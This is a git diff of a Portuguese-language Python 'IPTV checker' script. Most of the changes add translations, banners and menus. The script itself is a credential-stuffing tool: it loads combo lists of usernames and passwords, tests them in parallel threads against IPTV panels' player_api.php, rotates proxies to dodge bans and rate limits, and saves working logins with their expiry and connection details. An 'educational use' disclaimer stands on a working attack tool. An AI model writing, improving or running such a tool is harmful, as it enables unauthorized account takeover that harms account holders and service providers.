@@ -1,16 +1,40 @@
-# PYTHON CONFIGURATION BY DeepSeek & ReyFxck - Thomas
+"""
+PY CONFIG BY Thomas R., Telegram: @ReyFxck
+FEITO PARA AJUDAR QUEM PRECISA E DE GRAÇA!
+GITHUB: https://github.com/ReyFxck/DeepSeek-IPTV-Checker-BETA-
+FERRAMENTA EDUCACIONAL NÃO USE PARA O MAL
+PROIBIDO A VENDA DESTE SCRIPT!
+
+    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⡿⠿⢿⣿⣿⣿⣿⣿⣿
+    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠉⠉⠉⠙⠻⣅⠀⠈⢧⠀⠈⠛⠉⠉⢻⣿⣿
+    ⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣤⡶⠟⠀⠀⣈⠓⢤⣶⡶⠿⠛⠻⣿
+    ⣿⣿⣿⣿⣿⢣⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣀⣴⠶⠿⠿⢷⡄⠀⠀⢀⣤⣾⣿
+    ⣿⣿⣿⣿⣡⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣦⣤⣤⡀⠀⢷⡀⠀⠀⣻⣿⣿
+    ⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⠛⠶⠛⠃⠈⠈⢿⣿⣿
+    ⣿⣿⠟⠘⠀⠀⠀⠀⠀⠀⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠈⣿⣿
+    ⣿⠏⠀⠁⠀⠀⠀⠀⠀⠀⠀⢀⣶⡄⠀⠀⠀⠀⠀⠀⣡⣄⣿⡆⠀⠀⠀⠀⣿⣿
+    ⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠛⠛⢛⣲⣶⣿⣷⣉⠉⢉⣥⡄⠀⠀⠀⠨⣿⣿
+    ⡇⢠⡆⠀⠀⢰⠀⠀⠀⠀⢸⣿⣧⣠⣿⣿⣿⣿⣿⣿⣷⣾⣿⡅⠀⠀⡄⠠⢸⣿
+    ⣧⠸⣇⠀⠀⠘⣤⡀⠀⠀⠘⣿⣿⣿⣿⣿⠟⠛⠻⣿⣿⣿⡿⢁⠀⠀⢰⠀⢸⣿
+    ⣿⣷⣽⣦⠀⠀⠙⢷⡀⠀⠀⠙⠻⠿⢿⣷⣾⣿⣶⠾⢟⣥⣾⣿⣧⠀⠂⢀⣿⣿
+    ⣿⣿⣿⣿⣷⣆⣠⣤⣤⣤⣀⣀⡀⠀⠒⢻⣶⣾⣿⣿⣿⣿⣿⣿⣿⢀⣀⣾⣿⣿
+
+C o d e d - B y - T h o m a s - N o o b S o f r e !
+"""
 
 # importar bibliotecas padrão
 import os
 import sys
 import json
+import time
 import random
 import threading
+import traceback
 from datetime import datetime
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  # Ignora avisos SSL
+
 # Cores para melhorar a visualização
 class cor:
+    white_n = "\033[0;1m"
     vermelho = "\033[91m"
     verde = "\033[92m"
     amarelo = "\033[93m"
@@ -18,8 +42,11 @@ class cor:
     magenta = "\033[95m"
     ciano = "\033[96m"
     reset = "\033[0m"
+    c_azul = "\033[38;5;27m"
+    c_purple = "\033[38;5;200m"
     custom = "\033[38;5;208m"
     fail = "\033[1;38;5;9m"
+    atention = "\033[1;38;5;227m"
 
 # Verifica se as bibliotecas estão instaladas
 try:
@@ -48,13 +75,30 @@ except ImportError:
 # CONSTANTES E CONFIGURAÇÕES GLOBAIS
 # ======================================
 CONFIG_FILE = "config.json"
-LANG_DIR = "lang"
+LANG_DIR = "Language"
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def criar_t(config):
+    """Retorna uma função t() que já tem acesso ao config"""
+    def t(key, default=None):
+        keys = key.split('.')
+        current = carregar_idioma(config["idioma"]).get("translations", {})
+        
+        try:
+            for k in keys:
+                current = current[k]
+            return current
+        except (KeyError, TypeError):
+            return default if default is not None else key
+    return t
 
 def carregar_configuracoes():
     """Carrega ou cria arquivo de configuração"""
     defaults = {
         "sistema_operacional": None,
-        "idioma": "pt",
+        "idioma": None,
         "configurado": False
     }
     
@@ -86,38 +130,41 @@ def salvar_configuracao(config):
         json.dump(config_plana, f, indent=4)
 
 # Banner de decoração (normal em projetos)
-banner = """
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠠⡠⡠⣄⢤⠠⠀⠀⠀⠀⠀⠀⠠⡱⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⡀⢄⢄⡆⡦⡲⣕⢵⡱⣕⢦⡢⡇⣗⢝⢮⡣⡳⠁⠁⠀⠀⠀⠀⠀⠀⢕⡝⡮⣢⠠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢠
-⠀⠀⠀⠀⢀⢐⢴⡱⣝⢜⢮⢳⡹⡪⡎⣞⢜⢮⡪⡇⣗⢽⢸⡪⣳⠠⠀⠀⠀⠀⠀⠀⠀⢕⡇⡯⣪⢳⢕⢥⢀⠀⡀⡄⡄⡄⣔⢜⡎⡗
-⠀⠀⢀⢰⡸⣪⢳⢕⢵⢹⡪⣳⢹⡪⡇⣗⢽⢸⡪⡇⣗⢽⢸⡪⣎⢯⡪⡢⡀⠀⠀⠀⠀⠘⡮⡺⡜⡮⣳⢹⡢⣪⢺⡸⣕⢝⡎⡧⣫⠪
-⠀⠀⡆⣗⢽⢸⡪⣳⢹⢜⢮⡪⡇⣗⢝⡎⣗⢵⢹⡪⡎⣗⢵⡹⣜⢮⡪⣳⢹⡰⡀⠀⠀⠀⠙⡎⣗⢽⡸⣕⢽⡸⣕⢽⡸⡕⣇⢯⠪⠀
-⠠⡱⣝⢎⢗⢵⡹⣜⢮⢳⢕⡇⡯⡪⣇⢯⡪⡳⣕⢝⢮⡪⡇⣗⢕⡇⡯⡪⣇⢯⢺⡰⡀⠀⠀⠈⠪⡎⣞⢜⢮⢺⢜⢮⡪⡇⠗⠁⠀⠀
-⢱⡹⣪⢳⠹⠸⠪⠺⠸⡕⡧⡳⡝⡮⡺⡜⡮⣣⢳⢝⡜⣎⢧⡳⡕⣇⢯⡺⡜⡮⣳⢹⡪⡦⡠⢀⠀⡮⣪⢳⡹⡪⡃⠃⠁⠀⠀⠀⠀⠀
-⣇⢯⢺⡀⠀⠀⠀⠀⠀⠀⠈⠈⠊⠎⡗⣝⢮⢺⡸⣕⢽⡸⡕⣇⢯⡪⡃⠃⠋⢞⢜⡕⣇⢯⡪⣇⢧⡫⣎⢧⡫⡎⡂⠀⠀⠀⠀⠀⠀⠀
-⣗⢽⢸⡢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠪⡳⡹⣜⢮⡪⡇⣗⢕⢗⠜⢜⡄⠀⠑⢝⢜⡕⡧⡳⡕⡧⡳⡕⡧⡣⠀⠀⠀⠀⠀⠀⠀⠀
-⡳⡹⣜⢮⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠪⡺⡜⣎⢧⡳⡝⡮⡪⣎⢎⠀⠀⠀⢑⢇⢯⡪⣳⢹⡪⣳⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⢱⢝⢮⢺⢌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣎⢧⡳⡝⣎⢧⡳⣕⢆⢄⢄⢄⡝⣜⢮⡪⣇⢯⡪⡣⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠨⣪⢳⢕⢽⡐⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢜⢎⢧⡳⡕⡧⡳⡝⣎⢗⢵⡹⣜⢕⢧⢳⢕⠇⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠘⡮⡳⡕⣗⢔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢪⢳⢕⡝⣎⢗⡝⣎⢗⡕⡧⡳⡝⣎⢗⠍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠱⡹⡪⡎⣗⢵⠠⠀⠀⠀⠀⠀⠀⠀⡢⣢⢠⠀⠀⠀⠀⠀⠑⡇⡯⡪⣇⢯⡪⡇⣗⢝⡎⡧⡳⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠈⢳⢹⡪⣎⢯⡪⣄⢀⠀⠀⠀⠀⠱⡕⡧⣳⢱⡠⠀⠀⠀⠈⠪⡇⣗⢕⡇⡯⡪⡇⡗⠍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠑⢝⡜⡮⡺⡜⣖⢔⡄⡄⡀⡄⣇⢯⡪⣇⢯⡣⡥⡀⡀⠀⠈⠪⡣⡳⡝⣎⢗⡝⡵⣱⢱⡠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠑⠝⣎⢧⡳⣕⢝⡎⣗⢽⡸⡕⡧⡳⡕⣇⢯⡺⣜⢜⢴⡰⡬⡪⠣⠳⢕⢇⢯⢪⢇⠯⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠱⢕⢇⢯⢺⢜⡎⣗⢝⡎⡧⡳⡕⡧⡳⡝⠜⠊⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠁⠃⠋⠊⠃⠓⠙⠈⠁⠁⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
+def banner(config, t):
+    clear()
+    translated_by = t('traduce.traduce_json', default="Json não carregado")
+    print(f"""{cor.c_azul}
+        ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣤⣶⣶⣶⠶⠀⠀⠀⠀⣰⣿⣄            
+        ⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣷⣦⡀⢀⣀⣀⣠⣴⣿            
+        ⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⢹⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⡿           
+        ⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁        
+        ⣾⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⢨⣿⣿⣿⡟⠛⠉⠁        
+        ⣿⣿⡇⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣏⣉⠻⢿⣿⣿⣿⣿⣿⣿⣿⡇        
+        ⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣯⣿⡇⠀⢻⣿⣿⣿⣿⣿⣿⠁        
+        ⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣷⣦⣴⣿⣿⣿⣿⣿⠏        
+        ⢻⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟        
+        ⠀⠹⣿⣿⣿⣷⣄⠀⠀⠀⠀⣴⣦⣄⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⠋        
+        ⠀⠀⠙⢿⣿⣿⣿⣷⣄⡀⠀⢿⣿⣿⣿⣦⣄⠀⠙⢿⣿⣿⣿⣿⣿⣤⣀        
+        ⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣽⡿⢿⣿⣿⣿⣿⡿        
+        ⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀{cor.reset}
+{cor.c_purple}\n            DEEPSEEK IPTV CHECKER BY @ReyFxck
+            GitHub https://github.com/ReyFxck
+            Script Python, Version: 1 Beta: 5\n{cor.reset}
+            Translated by: {translated_by}{cor.reset}""")
 
 # ==============================================
 # GERENCIAMENTO DE IDIOMAS
 # ==============================================
-def carregar_idioma(idioma="pt"):
+def carregar_idioma(idioma):
     """Carrega traduções do arquivo de idioma"""
     lang_file = f"lang-{idioma}.json" if idioma != "default" else "lang.json"
-    lang_path = os.path.join(LANG_DIR, lang_file)
     
+    base_dir = os.path.dirname(os.path.abspath(__file__))
+    lang_path = os.path.join(base_dir, LANG_DIR, lang_file)
+
     # Fallback para inglês se o arquivo não existir
     if not os.path.exists(lang_path):
-        lang_path = os.path.join(LANG_DIR, "lang-en.json")
+        lang_path = os.path.join(base_dir, LANG_DIR, "lang-en.json")
         if not os.path.exists(lang_path):
             return {"translations": {}}
     
@@ -140,9 +187,9 @@ def listar_idiomas_disponiveis():
     return idiomas
 
 # Função para escolher o sistema operacional
-def escolher_sistema_operacional(t=None):
+def escolher_sistema_operacional(config, t=None):
     """Mostra opções de SO com tradução e confirma o caminho"""
-    print(banner)
+    banner(config, t)
     
     # Dicionário FIXO de mapeamento
     SISTEMAS_PADRONIZADOS = {
@@ -155,28 +202,28 @@ def escolher_sistema_operacional(t=None):
     
     # Textos traduzidos (com fallback)
     if t:
-        titulo = t.get('choose_os', 'Escolha o sistema operacional:')
-        ajuda = t.get('os_help', 'Isso define onde as pastas serão criadas:')
+        titulo = ('  Escolha o sistema operacional:')
+        ajuda = ('Isso define onde as pastas serão criadas:')
         opcoes_texto = {
-            "1": t.get("os_android", "Android"),
-            "2": t.get("os_windows", "Windows"),
-            "3": t.get("os_linux", "Linux"), 
-            "4": t.get("os_macos", "macOS"),
-            "5": t.get("os_ios", "iOS")
+            "1": ("Android"),
+            "2": ("Windows"),
+            "3": ("Linux"), 
+            "4": ("macOS"),
+            "5": ("iOS")
         }
-        prompt = t.get('choose_os_prompt', '>>')
-        erro_msg = t.get('invalid_os', 'Opção inválida!')
-        confirmacao = t.get('path_confirmation', 'Caminho que será usado:')
+        prompt = ('>>')
+        erro_msg = ('Opção inválida!')
+        confirmacao = ('Caminho que será usado:')
     else:
         titulo = "Escolha o sistema operacional:"
         ajuda = "Isso define onde as pastas serão criadas:"
         opcoes_texto = SISTEMAS_PADRONIZADOS.copy()
-        prompt = ">>"
+        prompt = ">>>"
         erro_msg = "Opção inválida!"
         confirmacao = "Caminho que será usado:"
 
     print(f"{cor.ciano}{titulo}{cor.reset}")
-    print(f"\n{cor.amarelo} [?] {ajuda}{cor.reset}\n")
+    print(f"\n{cor.amarelo}[?] {ajuda}{cor.reset}\n")
     
     # Mostra menu
     for num, nome in opcoes_texto.items():
@@ -184,7 +231,7 @@ def escolher_sistema_operacional(t=None):
     
     # Validação
     while True:
-        escolha = input(f"{cor.verde}{prompt} {cor.reset}").strip()
+        escolha = input(f"{cor.verde} {prompt} {cor.reset}").strip()
         
         if escolha in SISTEMAS_PADRONIZADOS:
             sistema_escolhido = SISTEMAS_PADRONIZADOS[escolha]
@@ -224,30 +271,43 @@ def limpar_host(host):
     return host
 
 # Função para listar arquivos em uma pasta e permitir a escolha pelo número
-def escolher_arquivo(pasta, nome_pasta):
+def escolher_arquivo(pasta, t, tipo="combo"):
     if not os.path.exists(pasta):
-        print(f"{cor.amarelo}A pasta {nome_pasta} não existe. Criando...{cor.reset}")
+        print(f"{cor.amarelo}  {t('responses.creating_folder_combo', 'Criando pasta:')} {pasta}{cor.reset}")
         os.makedirs(pasta)
         return None
-
+        
     arquivos = [f for f in os.listdir(pasta) if f.endswith('.txt')]
     if not arquivos:
-        print(f"{cor.vermelho}Nenhum arquivo encontrado na pasta {nome_pasta}.{cor.reset}")
+        print(f"{cor.vermelho}  {t('responses.file_not_found')}{cor.reset}")
         return None
-
-    print(f"{cor.ciano}Arquivos disponíveis em {nome_pasta}:{cor.reset}")
+     
+    print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
+    if tipo == "combo":
+        print(f"{cor.atention}  {t('questions.select_combo_file')}{cor.reset}")
+    else:
+        print(f"{cor.atention}  {t('questions.select_proxy_file')}{cor.reset}")
+        
     for i, arquivo in enumerate(arquivos):
-        print(f"{cor.azul}{i + 1}. {arquivo}{cor.reset}")
-
+        print(f"{cor.azul}  {i + 1}. {arquivo}{cor.reset}")
+        
+    print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
+    
+    # Mensagem diferente para combo ou proxy
+    if tipo == "combo":
+        print(f"\n{cor.ciano}  {t('questions.about_combo')}{cor.reset}")
+    else:
+        print(f"\n{cor.ciano}  {t('questions.about_proxy')}{cor.reset}")
+        
     try:
-        escolha = int(input(f"{cor.verde}Escolha o número do arquivo > {cor.reset}")) - 1
+        escolha = int(input(f"\n  {cor.verde}{t('responses.response')} >>> {cor.reset}")) - 1
         if 0 <= escolha < len(arquivos):
             return os.path.join(pasta, arquivos[escolha])
         else:
-            print(f"{cor.vermelho}Escolha inválida.{cor.reset}")
+            print(f"{cor.vermelho}\n  {t("responses.invalid_choice")}{cor.reset}")
             return None
     except ValueError:
-        print(f"{cor.vermelho}Entrada inválida. Digite um número.{cor.reset}")
+        print(f"{cor.vermelho}\n  {t("responses.invalid_input")}{cor.reset}")
         return None
 
 # Função para configurar o tipo de proxy
@@ -262,14 +322,14 @@ def configurar_proxy(tipo, proxy):
         return None
 
 # Função para converter timestamp em data legível (formato DD.MM.YYYY - HH:MM)
-def converter_data(timestamp):
+def converter_data(timestamp, t=None):
     try:
         return datetime.fromtimestamp(int(timestamp)).strftime('%d.%m.%Y - %H:%M')
     except:
-        return "Ilimitada!"
+        return t('checker.unlimited_time') if t else "Ilimitada"
 
 # Função para testar usuário e senha (com ou sem proxy)
-def test_account(username, password, proxy_config, server, headers):
+def test_account(username, password, proxy_config, server, headers, t):
     url = f"http://{server}/player_api.php?username={username}&password={password}"
     try:
         response = requests.get(
@@ -294,7 +354,7 @@ def test_account(username, password, proxy_config, server, headers):
                     # Busca dinâmica dos campos
                     status = user_info.get("status", data.get("status", "Desconhecido"))  # Verifica em 'user_info' e no nível raiz
                     exp_date = user_info.get("exp_date", data.get("exp_date"))  # Verifica em 'user_info' e no nível raiz
-                    exp_date = "Ilimitada!" if exp_date is None else converter_data(exp_date)
+                    exp_date = t('checker.unlimited_time') if exp_date is None else converter_data(exp_date, t)
                     
                     return username, password, status, exp_date, response.status_code, user_info, "hit"
                 else:
@@ -316,62 +376,64 @@ def test_account(username, password, proxy_config, server, headers):
             # Outros erros (Proxy ruim)
             return username, password, None, None, response.status_code, None, "proxy_ruim"
     except Exception as e:
-        print("erro", e)
         # Erro na requisição (Proxy ruim)
         return username, password, None, None, str(e), None, "proxy_ruim"
 
 # Função para salvar informações no arquivo de hits
-def salvar_hit(server, username, password, status, exp_date, user_info, caminho_arquivo):
+def salvar_hit(server, username, password, status, exp_date, user_info, caminho_arquivo, t=None):
     try:
         with open(caminho_arquivo, "a", encoding='utf-8') as f:
             f.write(f"=====[ DEEPSEEK CHECKER ]=====\n")
-            
+            f.write(f"DeepSeek Checker V5 Beta - Rev 1\n")
+            f.write(f"Coded by DeepSeek & ReyFxck Th.\n")
+            f.write(f"{t("traduce.traduce_hit")}\n")
+            f.write(f"=====[ HOST INFORMATION ]=====\n")
+
             # MESSAGE (se existir)
             if "message" in user_info and user_info["message"]:
-                f.write(f"MESSAGE: {user_info['message']}\n")
-            
+                f.write(f"{t("checker.message")}: {user_info["message"]}\n")
+
             # HOST, USER, PASS, STATUS
-            f.write(f"HOST: {server}\n")
-            f.write(f"USER: {username}\n")
-            f.write(f"PASS: {password}\n")
-            f.write(f"STATUS: {status}\n")
+            f.write(f"{t("checker.host")}: {server}\n")
+            f.write(f"{t("checker.user")}: {username}\n")
+            f.write(f"{t("checker.password")}: {password}\n")
+            f.write(f"{t("checker.status")}: {status}\n")
             
             # TESTE (is_trial)
             if "is_trial" in user_info:
-                teste = "SIM" if user_info["is_trial"] == "1" else "NÃO"
-                f.write(f"TESTE: {teste}\n")
+                teste = t("questions.yes") if user_info["is_trial"] == "1" else t("questions.no")
+                f.write(f"{t("checker.trial")}: {teste}\n")
             
             # EXP (data de expiração formatada)
-            if "exp_date" in user_info and user_info["exp_date"]:
-                exp_date = converter_data(user_info["exp_date"])
-                f.write(f"EXP: {exp_date}\n")
+            if exp_date:
+                f.write(f"{t('checker.expiration', 'EXP')}: {exp_date}\n")
             
             # CRIADO (data de criação formatada)
             if "created_at" in user_info and user_info["created_at"]:
                 criado = converter_data(user_info["created_at"])
-                f.write(f"CRIADO: {criado}\n")
+                f.write(f"{t("checker.created_at")}: {criado}\n")
             
             # CONN: ACT: | MAX: (conexões ativas e máximas)
             if "active_cons" in user_info and "max_connections" in user_info:
-                f.write(f"CONN: ACT: {user_info['active_cons']} | MAX: {user_info['max_connections']}\n")
+                f.write(f"{t("checker.connections")}: {t("checker.active_connections")}: {user_info["active_cons"]} | {t("checker.max_connections")}: {user_info["max_connections"]}\n")
             
             # TIMEZONE (se existir)
             if "timezone" in user_info and user_info["timezone"]:
-                f.write(f"TIMEZONE: {user_info['timezone']}\n")
+                f.write(f"{t("checker.timezone")}: {user_info["timezone"]}\n")
             
             # Rodapé
-            f.write(f"====[ IPTV CHK BY: ReyFxck ]====\n\n")
+            f.write(f"====[ IPTV CHK BY -- ReyFxck ]====\n\n\n")
     except Exception as e:
-        print(f"{cor.vermelho}Erro ao salvar o arquivo: {e}{cor.reset}")
+        print(f"{cor.vermelho}{t("responses.error_saving_file")} {e}{cor.reset}")
 
-def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, bans, total_linhas, caminho_arquivo, usar_proxy, arquivo_proxy):
+def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, bans, total_linhas, caminho_arquivo, usar_proxy, arquivo_proxy, config, t):
     lock = threading.Lock()
     proxies_bons = []  # Proxies que funcionaram (hit/bad)
     proxies_ruins = []  # Proxies que falharam (ban/429/proxy_ruim)
     contador_proxies = {}  # Conta quantas vezes cada proxy foi usada
     MAX_USOS_POR_PROXY = 10  # Máximo de usos por proxy
 
-    def worker():
+    def worker(config, t):
         nonlocal hits, bads, bans
         while True:
             with lock:
@@ -382,13 +444,13 @@ def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hit
 
             # Se não estiver usando proxy
             if usar_proxy != "1":
-                result = test_account(user, password, None, server, headers)
+                result = test_account(user, password, None, server, headers, t)
                 username, password, status, exp_date, status_code, user_info, resultado = result
                 
                 with lock:
                     if resultado == "hit":
                         hits += 1
-                        salvar_hit(server, username, password, status, exp_date, user_info, caminho_arquivo)
+                        salvar_hit(server, username, password, status, exp_date, user_info, caminho_arquivo, t)
                     elif resultado == "bad":
                         bads += 1
                     elif resultado == "ban":
@@ -409,7 +471,9 @@ def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hit
                     proxies_ruins_count=0,
                     tipo_proxy=None,
                     arquivo_proxy=None,
-                    proxy_escolhida=None
+                    proxy_escolhida=None,
+                    config=config,
+                    t=t
                 )
                 continue
 
@@ -427,7 +491,7 @@ def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hit
                         continue
                 
                 proxy_config = configurar_proxy(tipo_proxy, proxy_candidata)
-                result = test_account(user, password, proxy_config, server, headers)
+                result = test_account(user, password, proxy_config, server, headers, t)
                 username, password, status, exp_date, status_code, user_info, resultado = result
                 
                 with lock:
@@ -462,6 +526,7 @@ def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hit
                 elif resultado == "ban":
                     bans += 1
             
+#            banner(config, t)
             exibir_informacoes(
                 server=server,
                 user=username if 'username' in locals() else user,
@@ -477,18 +542,20 @@ def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hit
                 proxies_ruins_count=len(proxies_ruins),
                 tipo_proxy=tipo_proxy,
                 arquivo_proxy=arquivo_proxy,
-                proxy_escolhida=proxy_escolhida
+                proxy_escolhida=proxy_escolhida,
+                config=config,
+                t=t
             )
 
     # Inicia as threads
     threads = []
     for _ in range(num_bots):
-        t = threading.Thread(target=worker)
-        t.start()
-        threads.append(t)
+        thread = threading.Thread(target=worker, args=(config, t))
+        thread.start()
+        threads.append(thread)
 
-    for t in threads:
-        t.join()
+    for thread in threads:
+        thread.join()
 
     # Salva proxies boas/ruins (opcional)
     if usar_proxy == "1":
@@ -499,7 +566,7 @@ def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hit
 
     return hits, bads, bans
 
-def exibir_informacoes(server, user, password, status_code, linha_atual, total_linhas, hits, bads, bans, usar_proxy, proxies_bons_count=None, proxies_ruins_count=None, tipo_proxy=None, arquivo_proxy=None, proxy_escolhida=None):
+def exibir_informacoes(server, user, password, status_code, linha_atual, total_linhas, hits, bads, bans, usar_proxy, proxies_bons_count=None, proxies_ruins_count=None, tipo_proxy=None, arquivo_proxy=None, proxy_escolhida=None, config=None, t=None):
     deepseek = "\033[38;5;33m DEEPSEEK CHK\033[0m"
     infor_x = "\033[38;5;11m    INFORMATIONS\033[0m"
     created = "   BY ReyFxck"
@@ -508,21 +575,21 @@ def exibir_informacoes(server, user, password, status_code, linha_atual, total_l
     sys.stdout.write("\033[H\033[J")  # Código ANSI para limpar a tela
 
     # Tabela de informações gerais
-    tabela_geral = [
+    tabela_host = [
         ["\033[38;5;45m   Host: ", f"\033[38;5;47m http://{server} \033[0m"],
         ["\033[38;5;153m   Status: ", status_code],
         ["\033[38;5;81m   User: ", user],
         ["\033[38;5;117m   Pass: ", password],
-        ["==============config================="],
+#    ]
         ["\033[1;38;5;156m   Hits: ", f"   {hits} {cor.reset} "],
         [f"{cor.fail}   Fails: ", f"    {bads} "],
         ["\033[1;38;5;214m   Banned: ", f"   {bans} {cor.reset} "],
-        ["    COMBO -»", f"{linha_atual}/{total_linhas} "],
+        ["   Combo", f"{linha_atual}/{total_linhas} "],
         ["\033[38;5;189m   Restam: ", f" {total_linhas - linha_atual} "]
     ]
 
-    # Exibe a tabela geral
-    print(tabulate(tabela_geral, headers=[deepseek, infor_x], tablefmt="rst"))
+    banner(config, t)
+    print(tabulate(tabela_host, headers=[deepseek, infor_x], tablefmt="pretty"))
 
     # Tabela de configurações de proxies (se estiver usando proxies)
     if usar_proxy == "1":
@@ -550,55 +617,52 @@ def exibir_informacoes(server, user, password, status_code, linha_atual, total_l
     # Rodapé
     sys.stdout.flush()
 
-
-
-
-
-
-
-
-
-
 # ==============================================
 # MENUS E FLUXO PRINCIPAL
 # ==============================================
-def mostrar_menu_principal(config):
-    """Exibe o menu inicial e retorna a escolha"""
-    t = carregar_idioma(config["idioma"]).get("translations", {})
-    
-    print(banner)
-    print(f"\n{cor.ciano}=== {t.get('menu_title', 'MENU PRINCIPAL')} ==={cor.reset}")
-    print(f"{cor.azul}1. {t.get('menu_start', 'Iniciar script')}{cor.reset}")
-    print(f"{cor.azul}2. {t.get('menu_settings', 'Configurações')}{cor.reset}")
+def mostrar_menu_principal(config, t):
+    banner(config, t)
+    print(f"\n{cor.ciano}  ===== {t('menu.main_title')} ====={cor.reset}")
+    print(f"{cor.atention}  {t('menu.choose_option')}{cor.reset}")
+    print(f"{cor.azul}  = 1. {t('menu.menu_start')}{cor.reset}")
+    print(f"{cor.azul}  = 2. {t('menu.settings')}{cor.reset}")
+    print(f"{cor.azul}  = 3. {t('menu.exit_script')}{cor.reset}")
+    print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
     
     while True:
-        escolha = input(f"{cor.verde}>> {cor.reset}").strip()
-        if escolha in ("1", "2"):
+        escolha = input(f"{cor.verde}  {t('responses.response')} >>> {cor.reset}").strip()
+        if escolha in ("1", "2", "3"):
+            if escolha == "3":
+                banner(config, t)
+                print(f"\n  {cor.amarelo}{t('menu.exit_info1')}{cor.reset}")
+                print(f"  {cor.verde}{t('menu.exit_info2')}{cor.reset}")
+                print(f"  {cor.azul}{t('menu.exit_info3')}{cor.reset}")
+                print(f"  {cor.white_n}{t('menu.exit_info4')}{cor.reset}")
+                sys.exit(0)
             return escolha
-        print(f"{cor.vermelho}{t.get('invalid_option', 'Opção inválida!')}{cor.reset}")
+        print(f"\n{cor.vermelho}  {t('responses.invalid_option')}{cor.reset}")
 
-def mostrar_menu_configuracoes(config):
+def mostrar_menu_configuracoes(config, t):
     """Menu de configurações com opções de idioma e SO"""
-    t = carregar_idioma(config["idioma"]).get("translations", {})
-    
     while True:
-        print(banner)
-        print(f"\n{cor.ciano}=== {t.get('settings_title', 'CONFIGURAÇÕES')} ==={cor.reset}")
-        print(f"{cor.azul}1. {t.get('change_language', 'Alterar idioma')} (Atual: {config['idioma']}){cor.reset}")
